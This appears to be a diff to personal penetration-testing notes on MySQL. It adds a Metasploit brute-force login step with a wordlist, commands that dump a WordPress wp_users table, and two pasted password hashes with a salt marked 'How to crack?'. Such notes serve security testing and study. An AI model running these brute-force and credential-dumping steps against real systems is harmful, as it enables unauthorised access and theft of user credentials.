@@ -8,6 +8,7 @@ searchsploit MySQL <version>
 use auxiliary/scanner/mysql/mysql_version
 ```
 
+## Brute-Forcing MySQL
 ```
 use auxiliary/scanner/mysql/mysql_login
 set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
@@ -39,7 +40,22 @@ mysql -u root -p -h <ip>
 ```
 show databases;
 use <database>;
+show tables;
 select * from <table>;
+
+use wordpress;
+select * from wp_users;
+
+# Web app user info in the database.
+```
+
+```
+$P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
+$P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/
+
+Salt: G*=2"S^\529h#r7Y=aPP (from nmap scan)
+
+# How to crack?
 ```
 
 ```
